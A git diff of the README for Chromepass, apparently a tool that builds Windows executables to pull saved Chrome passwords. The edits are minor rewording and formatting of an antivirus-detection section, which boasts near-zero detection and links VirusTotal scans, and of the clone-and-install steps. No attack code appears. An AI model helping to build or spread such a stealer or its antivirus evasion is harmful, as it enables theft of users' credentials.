@@ -65,7 +65,7 @@ Chromepass is a python-based console application that generates a windows execut
 
 ### AV Detection!  
 
-The new client build methodology, practically ensures a 0% detection rate, even without AV-evasion tactics. If this becomes false in the future, some methods will be implemented to improve AV evasion.  
+The new client build methodology practically ensures a 0% detection rate, even without AV-evasion tactics. If this becomes false in the future, some methods will be implemented to improve AV evasion.  
 
 An example of latest scans (note: within 10-12 hours we go from 0-2 detections to 32 detections so run the analysis on your own builds): 
   * [VirusTotal Scan 1](https://www.virustotal.com/gui/file/156bc07e1bb214b237c51b640cbaf4727071a1e6b090088b4a339e53073dd613/detection)
@@ -83,14 +83,15 @@ This is a very simple application, which uses only:
 
 ### Installation
 
-Chromepass requires Windows to run! Support for linux and macOS may be added soon.
+>Chromepass requires Windows to compile! Support for linux and macOS may be added soon.
 
-Clone the repository:
+#### **Clone the repository**:
 ```powershell
 git clone https://github.com/darkarp/chromepass
 ```
+>Note: Alternatively to cloning the repository, you can download the latest release, since the repository may be more bug-prone.
 
-Install the dependencies:
+### **Install the dependencies**:
 
 The dependencies are checked and installed automatically, so you can just skip to [Usage](#usage). It's recommended that you use a clean VM, just to make sure there are no conflicts.
 
